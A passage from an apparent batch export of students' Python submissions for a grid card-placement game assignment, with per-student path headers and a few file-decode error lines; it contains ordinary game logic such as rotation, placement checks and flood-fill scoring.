                    matrix[y + indeks[0]][x + indeks[1]] = int(Card[y][x])
            return matrix


        # - - - - - - - - - - - - - - - - DRIVING_CODE - - - - - - - - - - - - - - - -
        if newCardOnDesk != []:
            pos = [newCardOnDesk[0],newCardOnDesk[1]]
            LMM = simplePut(self.LMM, pos, newCardOnDesk[2])
            self.LMM = LMM
        else:
            LMM = self.LMM

        MOS = createMatrixOfSpaces(LMM)
        freeCards = self.cardsAtHand
        newFreeCards = self.rotatedCardsAtHand

        if freeCards != []:
            finalIndexes = []
            for card in freeCards:
                pindex = findIndexesOfArea(MOS, int(card[0][0]), int(card[0][1]), freeCards.index(card), LMM)
                if pindex != []:
                    finalIndexes.append(pindex)

            if finalIndexes != []:
                bestIndex = chooseBestIndex(finalIndexes, LMM)
                Card = self.rotatedCardsAtHand[bestIndex[3]][bestIndex[4]][1]


                self.LMM = simplePut(LMM, [bestIndex[0],bestIndex[1]], Card)

                self.cardsAtHand = self.cardsAtHand[:bestIndex[3]] + self.cardsAtHand[bestIndex[3] + 1:]
                self.rotatedCardsAtHand = self.rotatedCardsAtHand[:bestIndex[3]] + self.cardsAtHand[bestIndex[3] + 1:]

                return [bestIndex[0], bestIndex[1], Card]
            else:
                return []
        else:
            return []    hribavan
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/hribavan______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Zydrunas Ilgauskas"
        
                       
        
        
    def play(self,newCardOnDesk):




        def rotace(karta, stupen): #otoceni karty o stpen*90 stupnu
            z = 0
            while z != stupen:
                r = len(karta)
                s = len(karta[0])
                vysledek = []
                for x in range(s): vysledek.append([0]*r)
                for i in range(r):
                    for j in range(s):
                        vysledek[-j-1][i] = karta[i][j]
                z+=1
                karta = vysledek
            return karta
            

        def zmaticovani(radek,moje): #prepsani radkoveho zapisu karty do maticoveho
            radek = radek.split()
            for x in range(len(radek)): radek[x] = int(radek[x])
            if moje :
                r = radek[0]
                s = radek[1]
                off = 2
            else:
                r = radek[2]
                s = radek[3]
                off = 4
            vysledek = []
            for y in range(r): vysledek.append([0]*s)
            for i in range(r):
                for j in range(s):
                    vysledek[i][j] = radek[off + (s*i + j)]
            return vysledek
            
        def zradkovani(matice, poloha_x, poloha_y, moje): #prepsani matice do jednoho radku
            r = len(matice)
            s = len(matice[0])
            if moje:
                off = 2
                vysledek = [0] *(off + r*s)
                vysledek[0] = r
                vysledek[1] = s
            else:
                off = 4
                vysledek = [0] *(off + r*s)
                vysledek[0] = poloha_x
                vysledek[1] = poloha_y
                vysledek[2] = r
                vysledek[3] = s
            for i in range(r):
                for j in range(s):
                    vysledek[off + (s*i + j)] = matice[i][j]
            vysledek = ' '.join(map(str,vysledek))
            return vysledek

        def hraci_pole(r,s):
            deska = []
            for i in range(r): deska.append([8]*s)
            return deska
            
            

        def pridat_kartu(hraci_deska, pozice_r, pozice_s, karta):
            for i in range(len(karta)):
                for j in range(len(karta[0])):
                    hraci_deska[pozice_r+i][pozice_s+j] = karta[i][j]
            return hraci_deska
            
        def show(hraci_deska):
            hraci = copy.deepcopy(hraci_deska)
            for i in range(len(hraci)):
                for j in range(len(hraci[0])):
                    if hraci[i][j] == 8:
                        hraci[i][j] = '*'
                    elif hraci[i][j] == 9:
                        hraci[i][j] = '-'
                    else:
                        hraci[i][j] = str(hraci[i][j])

            for z in range(len(hraci)): print(' '.join(map(str,hraci[z])))
            print()

        def mozny_placement(hraci_deska):
            for i in range(len(hraci_deska)):
                for j in range(len(hraci_deska[0])):#offsety a = i+1 b = i-1 c = j+1 d = j-1
                    a=0
                    b=0
                    c=0
                    d=0
                    if i+1 >= len(hraci_deska):
                        a = i
                    else:
                        a = i+1

                    if i-1 < 0:
                        b = i
                    else:
                        b = i-1

                    if j+1 >= len(hraci_deska[0]):
                        c = j
                    else:
                        c = j+1

                    if j-1 < 0:
                        d = j
                    else:
                        d = j-1

                    
                    if hraci_deska[i][j] == 8 and ((hraci_deska[a][j] < 8) or (hraci_deska[b][j] < 8) or (hraci_deska[i][c] < 8) or (hraci_deska[i][d] < 8)):
                        hraci_deska[i][j] = 9

            #show(hraci_deska)


        def moje_karty_rozsireni(mojekarty):
            karty = copy.deepcopy(mojekarty)

            for karta in karty:
                for i in range(1,2):
                    mojekarty.append(rotace(karta,i))
            return mojekarty



        def mozne_vysledky(mojekarty, pole):
            moznosti = []
            for k in range(len(mojekarty)):
                
                for o in range(2):
                    if o == 0:
                        karta = mojekarty[k]
                    elif o == 1:
                        karta = rotace(mojekarty[k],1)
                    r = len(mojekarty[k])
                    s = len(mojekarty[k][0])
                    for i in range(len(pole)-r+1):
                        for j in range(len(pole[0]) - s+1):
                            zapsani = True
                            hrana = False
                            for m in range(r):
                                for n in range(s):
                                    if pole[i+m][j+n] == 9:
                                        hrana = True
                                    if pole[i+m][j+n] <= 4:
                                        zapsani = False
                                    
                            if zapsani == True and hrana == True:
                                 return [i,j,k,karta] 
                        

            if moznosti != []:
                #return moznosti[0]
                return random.choice(moznosti)
            else:
                return []
            

        #print(self.cardsAtHand)
        if len(self.cardsAtHand) == 0:
            return []
        if newCardOnDesk == [] and self.cardsOnDesk == []:
            hraci_deska = hraci_pole(self.boardRows,self.boardCols)
            cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
            card = self.cardsAtHand[cardindx]
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows-cardRows-1) 
            col = random.randint(0, self.boardCols-cardCols-1)
            self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
            self.cardsOnDesk += [ [row, col, card ] ]
            return [row, col, card ]
        
        elif newCardOnDesk == []:
            hraci_deska = hraci_pole(self.boardRows,self.boardCols)
            for karta in self.cardsOnDesk:
                hraci_deska = pridat_kartu(hraci_deska,karta[0], karta[1], karta[2])
            moje_karty = copy.deepcopy(self.cardsAtHand)
            mozny_placement(hraci_deska)
            vysledek = mozne_vysledky(moje_karty, hraci_deska)
            if vysledek == []:
                return []
            
            self.cardsAtHand = self.cardsAtHand[:vysledek[2]] + self.cardsAtHand[vysledek[2]+1:]
            self.cardsOnDesk += [ [ vysledek[0], vysledek[1], vysledek[3] ] ]
            return [vysledek[0], vysledek[1], vysledek[3] ]


        else:
            hraci_deska = hraci_pole(self.boardRows,self.boardCols)
            self.cardsOnDesk += [ newCardOnDesk ]
            for karta in self.cardsOnDesk:
                hraci_deska = pridat_kartu(hraci_deska,karta[0], karta[1], karta[2])
            moje_karty = copy.deepcopy(self.cardsAtHand)
            mozny_placement(hraci_deska)
            vysledek = mozne_vysledky(moje_karty, hraci_deska)
            if vysledek == []:
                return []
            
            self.cardsAtHand = self.cardsAtHand[:vysledek[2]] + self.cardsAtHand[vysledek[2]+1:]
            self.cardsOnDesk += [ [ vysledek[0], vysledek[1], vysledek[3] ] ]
            return [vysledek[0], vysledek[1], vysledek[3] ]


            """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position
                


        '''      zadani = []


        hraci_deska, moje_karty = hraci_pole(zadani)
        #show(hraci_deska)
        mozny_placement(hraci_deska, moje_karty)
        moje_karty = moje_karty_rozsireni(moje_karty)
        vysledek = mozne_vysledky(moje_karty, hraci_deska)

        vysledek[2] = moje_karty[vysledek[2]]
        print(' '.join(map(str, vysledek)))'''



        ''' if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]

        if len(self.cardsAtHand) == 0:
            return []

        cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
        card = self.cardsAtHand[cardindx]
        cardRows = len(card)
        cardCols = len(card[0])
        row = random.randint(0, self.boardRows-cardRows-1) 
        col = random.randint(0, self.boardCols-cardCols-1)
        self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
        self.cardsOnDesk += [ [row, col, card ] ]
        return [row, col, card ]
        '''

if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    vosahond
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/vosahond______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 4018: ordinal not in range(128)    kolarj60
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/kolarj60______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

def rotate(card):
    return [[card[j][o] for j in range(len(card))] for o in range(len(card[0]) - 1, -1, -1)]

def place_card(board, card):
    row, col, matrix = card
    for r in range(len(matrix)):
        for c in range(len(matrix[0])):
            board[r+row][c+col] = matrix[r][c]

def enough_space(board, card):
    row, col, matrix = card
    dims = (len(matrix), len(matrix[0]))
    if row+dims[0] > len(board):
        return False
    if col+dims[1] > len(board[0]):
        return False
    for r in range(dims[0]):
        for c in range(dims[1]):
            if board[r + row][c + col] is not None:
                return False
    return True

def is_bordering(board, card):
    row, col, matrix = card
    dims = (len(matrix), len(matrix[0]))
    val = False
    for i in range(dims[1]):
        if row != 0:
            if board[row-1][col+i] is not None:
                val = True
                break
        if row+dims[0] < len(board):
            if board[row+dims[0]][col+i] is not None:
                val = True
                break
    if not val:
        for i in range(dims[0]):
            if col != 0:
                if board[row+i][col-1] is not None:
                    val = True
                    break
            if col+dims[1] < len(board[0]):
                if board[row+i][col+dims[1]] is not None:
                    val = True
                    break
    return val

def get_valid_pos(board, card, starting):
    for r in range(len(board)):
        for c in range(len(board[0])):
            if board[r][c] is None:
                if not starting:
                    if enough_space(board, [r, c, card]) and is_bordering(board, [r, c, card]):
                        return r,c
                else:
                    if enough_space(board, [r, c, card]):
                        return r,c

#card structure: [row, col, card_matrix] (placed card)
#not placed cards: card_matrix
class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Randomness itself"
        self.cards_available = [1 for _ in range(len(self.cardsAtHand))]
        self.board = [[None for _ in range(self.boardCols)] for _ in range(self.boardRows)]

    def play(self, newCardOnDesk):
        starting = False
        if newCardOnDesk:
            place_card(self.board, newCardOnDesk)
        else:
            starting = True
        for i in range(len(self.cards_available)):
            if self.cards_available[i] == 1:
                card = self.cardsAtHand[i]
                pos = get_valid_pos(self.board, card, starting)
                pos1 = get_valid_pos(self.board, rotate(card), starting)
                if pos is not None:
                    place_card(self.board, [pos[0], pos[1], card])
                    self.cards_available[i] = 0
                    return [pos[0], pos[1], card]
                if pos1 is not None:
                    self.cards_available[i] = 0
                    place_card(self.board, [pos1[0], pos1[1], rotate(card)])
                    return [pos1[0], pos1[1], rotate(card)]
        return []



if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    matoum12
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/matoum12______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 20589: ordinal not in range(128)    kindlfr1
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/kindlfr1______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw

class Position:
    def __init__(self, y: int, x: int):
        self.y = y
        self.x = x

    def __repr__(self):
        return f" {self.y:02d}|{self.x:02d} "

    def __eq__(self, other):
        return self.y == other.y and self.x == other.x

    def __hash__(self):
        return hash((self.y, self.x))

    def is_occupied(self, board: list):
        if self.is_valid(board):
            return not board[self.y][self.x] == -1
        return False

    def get_value(self, board):
        if self.is_valid(board):
            return board[self.y][self.x]

    def is_valid(self, board: list):
        if 0 <= self.x < len(board[0]) and 0 <= self.y < len(board):
            return True
        return False

    def get_neighbors(self, board: list):
        positions = []
        if Position(self.y, self.x + 1).is_valid(board):
            positions.append(Position(self.y, self.x + 1))
        if Position(self.y, self.x - 1).is_valid(board):
            positions.append(Position(self.y, self.x - 1))
        if Position(self.y + 1, self.x).is_valid(board):
            positions.append(Position(self.y + 1, self.x))
        if Position(self.y - 1, self.x).is_valid(board):
            positions.append(Position(self.y - 1, self.x))
        return positions

    def is_inside_card(self, card):
        if card.position.x <= self.x <= card.position.x + card.rectangle.width - 1 and card.position.y <= self.y <= card.position.y + card.rectangle.height - 1:
            return True
        return False


class Rectangle:
    def __init__(self, height: int, width: int, ):
        self.width = width
        self.height = height

    def __repr__(self):
        return f" {self.height:02d}|{self.width:02d} "

    def can_fit_into(self, other: "Rectangle"):
        if self.height <= other.height and self.width <= other.width:
            return True
        return False

    def __eq__(self, other):
        return self.height == other.height and self.width == other.width

    def __hash__(self):
        return hash((self.height, self.width))


class PlayingCard:
    ID = 0

    def __init__(self, matrix: list, position: Position, rectangle: Rectangle, ID = -1):
        self.matrix = matrix
        self.position = position
        self.rectangle = rectangle
        if ID == -1:
            self.id = PlayingCard.ID
            PlayingCard.ID += 1
        else:
            self.id = ID


    def __repr__(self):
        position = self.position
        matrix = self.matrix
        rectangle = self.rectangle
        result = str(position.y) + " " + str(position.x) + " " + str(rectangle.height) + " " + str(
            rectangle.width) + " id<" + str(self.id) + "> "
        result = result + " ".join(str(value) for row in matrix for value in row)
        return result

    def __eq__(self, other):
        return self.matrix == other.matrix

    def __hash__(self):
        return hash(tuple(tuple(row) for row in self.matrix))


def rotate(card: PlayingCard):
    matrix = card.matrix
    height = card.rectangle.height
    width = card.rectangle.width
    rotated_matrix = [[0] * height for _ in range(width)]
    max_height = height - 1
    for i in range(width):
        for j in range(height):
            rotated_matrix[i][max_height - j] = matrix[j][i]
    return PlayingCard(rotated_matrix, card.position, Rectangle(width, height),card.id)


def place_card(card: PlayingCard, playing_board):
    x, y, width, height = card.position.x, card.position.y, card.rectangle.width, card.rectangle.height
    for _x in range(width):
        for _y in range(height):
            playing_board[_y + y][_x + x] = card.matrix[_y][_x]

def unplace_card(card: PlayingCard, playing_board):
    x, y, width, height = card.position.x, card.position.y, card.rectangle.width, card.rectangle.height
    for _x in range(width):
        for _y in range(height):
            playing_board[_y + y][_x + x] = -1

def flood_fill(position: Position, playing_board: list, card: PlayingCard):
    value = playing_board[position.y][position.x]
    stack = []
    length = 0
    if value > 0:
        stack.append(position)
    is_inside_rectangle = True
    while stack:
        current_position = stack.pop()
        if is_inside_rectangle:
            if not current_position.is_inside_card(card):
                is_inside_rectangle = False
        neighbors = current_position.get_neighbors(playing_board)
        for neighbor in neighbors:
            if neighbor.get_value(playing_board) == value:
                stack.append(neighbor)
        length += 1
        playing_board[current_position.y][current_position.x] = 0
    if length < 2 or is_inside_rectangle:
        return 0
    return length


def get_value(card: PlayingCard, playing_board):
    place_card(card, playing_board)
    y, x, height, width = card.position.y, card.position.x, card.rectangle.height, card.rectangle.width
    score = 0
    for _y in range(height):
        for _x in range(width):
            score += flood_fill(Position(y + _y, x + _x), playing_board, card)
    unplace_card(card, playing_board)
    return score


def process_unplaced_card(card):
    width = len(card[0])
    height = len(card)
    return PlayingCard(card, Position(-1,-1), Rectangle(height, width))

def process_placed_card(card):
    y,x = card[0],card[1]
    card = card[2:]
    Card = process_unplaced_card(card[0])
    Card.position = Position(y, x)
    return Card

def generate_rectangle_map(rectangle_map,board_size_x,board_size_y,playing_board):
    for x in range(board_size_x - 1, -1, -1):
        for y in range(board_size_y - 1, -1, -1):
            current_rectangle = Rectangle(0, 0)
            if playing_board[y][x] == -1:
                if y < len(playing_board) - 1 and x < len(playing_board[0]) - 1:
                    rectangle_map[y][x] = Rectangle(rectangle_map[y + 1][x].height + 1,
                                                    rectangle_map[y][x + 1].width + 1)
                elif y < len(playing_board) - 1:
                    rectangle_map[y][x] = Rectangle(rectangle_map[y + 1][x].height + 1, 1)
                elif x < len(playing_board[0]) - 1:
                    rectangle_map[y][x] = Rectangle(1, rectangle_map[y][x + 1].width + 1)
                else:
                    rectangle_map[y][x] = Rectangle(1, 1)
            else:
                rectangle_map[y][x] = Rectangle(0, 0)


def generate_maps_of_valid_placements_for_rectangle(rectangles_for_placement,rectangle_map,playing_board):
    maps_of_valid_placements_for_rectangles = []
    for rectangle in rectangles_for_placement:
        map_of_valid_placements = [[0 for _ in range(len(rectangle_map[0]))] for __ in range(len(rectangle_map))]
        for y in range(len(rectangle_map)):
            for x in range(len(rectangle_map[0])):
                if rectangle.can_fit_into(rectangle_map[y][x]):
                    can_fit = True
                    for i in range(rectangle.width):
                        if rectangle_map[y][x + i].height < rectangle.height:
                            can_fit = False
                    if can_fit:
                        map_of_valid_placements[y][x] = 1
        maps_of_valid_placements_for_rectangles.append(map_of_valid_placements)

    for rectangle_index in range(len(rectangles_for_placement)):
        rectangle = rectangles_for_placement[rectangle_index]
        map = maps_of_valid_placements_for_rectangles[rectangle_index]
        for y in range(len(map)):
            for x in range(len(map[0])):
                if map[y][x] == 1:
                    possible_neighbour_position = []
                    for _x in range(-1, rectangle.width + 1):
                        for _y in range(-1, rectangle.height + 1):
                            possible_neighbour_position.append(Position(y + _y, x - 1))
                            possible_neighbour_position.append(Position(y - 1, _x + x))
                            possible_neighbour_position.append(Position(y + _y, x + rectangle.width))
                            possible_neighbour_position.append(Position(y + rectangle.height, x + _x))
                    possible_neighbour_position = list(set(possible_neighbour_position))
                    max_x, min_x = possible_neighbour_position[0].x, possible_neighbour_position[0].x
                    max_y, min_y = possible_neighbour_position[0].y, possible_neighbour_position[0].y

                    for position in possible_neighbour_position:
                        if position.x > max_x:
                            max_x = position.x
                        if position.x < min_x:
                            min_x = position.x
                        if position.y > max_y:
                            max_y = position.y
                        if position.y < min_y:
                            min_y = position.y

                    for position in possible_neighbour_position[::]:
                        if (position.y == max_y and position.x == min_x) or (
                                position.y == max_y and position.x == max_x) or (
                                position.y == min_y and position.x == min_x) or (
                                position.y == min_y and position.x == max_x):
                            possible_neighbour_position.remove(position)

                    can_be_placed = False
                    for position in possible_neighbour_position:
                        if position.is_occupied(playing_board):
                            can_be_placed = True
                            break
                    if not can_be_placed:
                        maps_of_valid_placements_for_rectangles[rectangle_index][y][x] = 0
    return maps_of_valid_placements_for_rectangles


def get_best_card(my_cards_with_rotation, rectangles_for_placement, maps_of_valid_placements_for_rectangles, playing_board, turn):
    max_score = -1
    best_card = PlayingCard([0], Position(-10, -10), Rectangle(-1, -1))
    has_found_card = False
    for card in my_cards_with_rotation:
        rectangle = card.rectangle
        rectangle_index = rectangles_for_placement.index(rectangle)
        map = maps_of_valid_placements_for_rectangles[rectangle_index]
        for y in range(len(map)):
            for x in range(len(map[0])):
                if map[y][x] == 1:
                    card.position = Position(y, x)
                    if not has_found_card:
                        best_card = PlayingCard(card.matrix, card.position, card.rectangle,ID = card.id)
                        has_found_card = True
                    score = get_value(card,playing_board)
                    if score >= max_score:
                        best_card = PlayingCard(card.matrix, card.position, card.rectangle,ID = card.id)
                        max_score = score
    if best_card == PlayingCard([0], Position(-10, -10), Rectangle(-1, -1)):
        if turn == 0:
            best_card = my_cards_with_rotation[0]
            best_card.position = Position(0,0)
        else:
            return []
    return best_card


def to_array(best_card):
    if type(best_card) == PlayingCard:
        array = []
        array.append(best_card.position.y)
        array.append(best_card.position.x)
        array.append(best_card.matrix)
        return array
    else:
        return best_card


def remove_card_from_my_cards(id, my_cards_with_rotation):
    for i in range(len(my_cards_with_rotation)-1,-1,-1):
        if my_cards_with_rotation[i].id == id:
            my_cards_with_rotation.pop(i)

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Delulu"
        self.turn = 0
        self.login = login
        self.board_size_y = boardRows
        self.board_size_x = boardCols
        self.my_cards = [process_unplaced_card(card) for card in cardsAtHand]
        self.board = [[-1 for j in range(self.board_size_x)] for i in range(self.board_size_y)]
        self.rectangle_map = [[Rectangle(0,0) for _ in range(self.board_size_x)] for __ in range(self.board_size_y)]
        generate_rectangle_map(self.rectangle_map, self.board_size_x, self.board_size_y, self.board)
        self.my_cards_with_rotation = self.my_cards[::]
        for card in self.my_cards[::]:
            for i in range(3):
                card = rotate(card)
                self.my_cards_with_rotation.append(card)
        self.rectangles_for_placement = []
        for card in self.my_cards_with_rotation:
            self.rectangles_for_placement.append(card.rectangle)
        self.rectangles_for_placement = list(set(self.rectangles_for_placement))
        self.maps_of_valid_placements_for_rectangles = generate_maps_of_valid_placements_for_rectangle(self.rectangles_for_placement,self.rectangle_map,self.board)
        self.best_card = get_best_card(self.my_cards_with_rotation, self.rectangles_for_placement, self.maps_of_valid_placements_for_rectangles, self.board,self.turn)

    def play(self, newCardOnDesk:list):
        # for card in self.my_cards_with_rotation:
        #     print(card)
        # print("moje karty")
        self.turn += 1
        if self.turn == 1:
            if len(newCardOnDesk) == 0:
                id = self.best_card.id
                remove_card_from_my_cards(id, self.my_cards_with_rotation)
                place_card(self.best_card,self.board)
                return to_array(self.best_card)
        if not len(newCardOnDesk) == 0:
            place_card(process_placed_card(newCardOnDesk), self.board)
        generate_rectangle_map(self.rectangle_map, self.board_size_x, self.board_size_y, self.board)
        self.rectangles_for_placement = []
        for card in self.my_cards_with_rotation:
            self.rectangles_for_placement.append(card.rectangle)
        self.rectangles_for_placement = list(set(self.rectangles_for_placement))
        self.maps_of_valid_placements_for_rectangles = generate_maps_of_valid_placements_for_rectangle(
            self.rectangles_for_placement, self.rectangle_map, self.board)
        self.best_card = get_best_card(self.my_cards_with_rotation, self.rectangles_for_placement, self.maps_of_valid_placements_for_rectangles, self.board,self.turn)
        if type(self.best_card) == PlayingCard:
            remove_card_from_my_cards(self.best_card.id, self.my_cards_with_rotation)
            place_card(self.best_card,self.board)
            return to_array(self.best_card)
        return []


    jiraktad
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/jiraktad______________________
        player.py
import base as BASE
import random, time, sys, os
from PIL import Image, ImageDraw
from copy import deepcopy
import matplotlib.pyplot as plt
import numpy as np
#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

def MPrint(matrix):
    for i in range(len(matrix)):
        string = ''
        for j in range(len(matrix[0])):
            string += str(matrix[i][j]) + ' '
        print(string)

def floodfill(m, x, y): #ale sem blbej a x je index radku a y index sloupce
    rows = len(m)
    cols = len(m[0])
    
    # kouka jestli invalidni vstup
    if (x < 0) or (x >= rows) or (y < 0) or (y >= cols): #pristup zezadu je nepripustny
        print('do floodfillu lezou ilegalni souradnice')
        return 0
    start_color = m[x][y]
    #zacne na prazdnym policku -> nepocita to protoze je chytrej
    if start_color == 'X' or start_color == 0:
        return 0
    #smery bc je to vlastne fajn chytrym zpusobem drStepana
    directions = [(-1, 0), (1, 0), (0, -1), (0, 1)]

    def is_valid(CurrX, CurrY): #funkce uvnitr funkce je fajnova vec, mel sem to zkusit uz driv
        IsLegit = False
        if 0 <= CurrX < rows and 0 <= CurrY < cols and m[CurrX][CurrY] == start_color:
            IsLegit = True
        return IsLegit

    #pocitaci sekce zde
    count = 0
    stack = [(x, y)]

    while stack:
        cx, cy = stack.pop() #psat porad CurrX a CurrY je otravny
                             #ale CurrY je funny, ale stejne cx a cy nekde, protoze lenost

        if m[cx][cy] != start_color:
            continue
        
        #musi oznacit kde uz byl zejo.. neopakuj chyby, jinak dela infinite loop blbecku
        m[cx][cy] = '*'
        count += 1

        #validni sousedy da na stack
        for dx, dy in directions:
            CurrX, CurrY = cx + dx, cy + dy
            if is_valid(CurrX, CurrY):
                stack.append((CurrX, CurrY))

    return count

def visualize_matrix(matrix): #toto neni moje funkce, dela barevny obrazky abych to mohl lepe cist
    #na funkcnost programu to nema vliv, jenom vykresluje
# Map 'X' to a specific value, e.g., -1
    matrix_numeric = [[-1 if cell == 'X' else cell for cell in row] for row in matrix]
    
    # Define colormap: white for 'X', grey for 0, and distinct colors for integers
    cmap = {
        -1: (1, 1, 1),  # White for 'X'
        0: (0.8, 0.8, 0.8),  # Grey for 0
        1: (1, 0, 0),  # Red for 1
        2: (0, 1, 0),  # Green for 2
        3: (0, 0, 1),  # Blue for 3
        4: (1, 1, 0)   # Yellow for 4
    }
    
    # Create a color matrix for visualization
    color_matrix = np.array([[cmap[cell] for cell in row] for row in matrix_numeric])
    
    # Create the plot
    fig, ax = plt.subplots(figsize=(8, 8))
    ax.imshow(color_matrix, interpolation='none', aspect='equal')
    
    # Add gridlines (black borders) with square cells
    ax.set_xticks(np.arange(-0.5, len(matrix[0]), 1), minor=True)
    ax.set_yticks(np.arange(-0.5, len(matrix), 1), minor=True)
    ax.grid(which="minor", color="black", linestyle='-', linewidth=1.5)
    ax.tick_params(which="minor", size=0)  # Hide minor ticks
    
    # Remove major ticks and labels
    ax.set_xticks([])
    ax.set_yticks([])
    
    # Display the plot
    plt.show()

class Card:
    def __init__(self,CardMatrix): #dovnitr jde matice karty se souradnicema na zacatku
        self.height = len(CardMatrix)
        self.width = len(CardMatrix[0])
        self.matrix = CardMatrix

    def rotate(self):
        self.rotated = []
        self.width, self.height = self.height, self.width
        for r in range(self.height):
            arr = []
            for s in range(self.width):
                arr.append('X') 
            self.rotated.append(arr)

        for r in range(self.height):
            for s in range(self.width):
                self.rotated[r][-s] = self.matrix[-s][r]
        for r in range(self.height):
            self.rotated[r] = self.rotated[r][::-1]
        self.matrix = deepcopy(self.rotated)

class Board:
    def __init__(self,Height,Width):
        self.matrix = []
        self.height = Height
        self.width = Width
        self.placed = 0
        self.lastmatrix = []
        for row in range(Height):
            self.matrix.append([])
            for col in range(Width):
                self.matrix[row].append('X')
        
    def place(self, card, x, y):  #x is row, y is col, card is card matrix
        CardMatrix = card
        #backtrack
        self.lastmatrix = deepcopy(self.matrix)

        #placne tam kartu
        for row in range(len(CardMatrix)):
            for col in range(len(CardMatrix[0])):
                self.matrix[x + row][y + col] = CardMatrix[row][col]

        #updatne volny policka (coz stejne nikde nepouzivam nakonec)
        self.placed += 1

    def undo(self):
        self.matrix = self.lastmatrix
        self.placed -= 1

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
